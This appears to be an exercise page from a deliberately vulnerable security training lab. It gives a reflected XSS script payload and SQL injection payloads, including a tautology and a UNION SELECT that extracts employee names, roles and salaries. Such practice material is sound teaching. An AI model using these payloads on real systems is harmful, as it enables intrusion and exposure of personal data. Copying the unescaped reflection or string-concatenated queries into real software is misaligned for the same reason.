Security Lab — Attack Exercises

🔴 Exercise 1 — Reflected XSS

The portal search reflects the q parameter directly into the HTML without escaping. Any HTML or JavaScript in the input is executed by the browser.

Payload
<script>alert('XSS from AcmeCorp')</script>
Attack URL
/?q=<script>alert('XSS from AcmeCorp')</script> ▶ Launch XSS ▶ HTML Injection
✔ Expected: browser alert fires / bold red text appears in the search result area.

🟣 Exercise 2 — SQL Injection

The /search endpoint builds its query by concatenating user input directly into a SQL string. Injected SQL changes what the database returns.

Payload — dump all rows
' OR '1'='1
Attack URL
/search?q=' OR '1'='1 ▶ Dump All Rows
Payload — UNION extraction
' UNION SELECT id,name,role,salary,department FROM employees-- ▶ UNION Attack
✔ Expected: all employee records returned; the raw SQL string is shown above the results so you can see exactly what was injected.
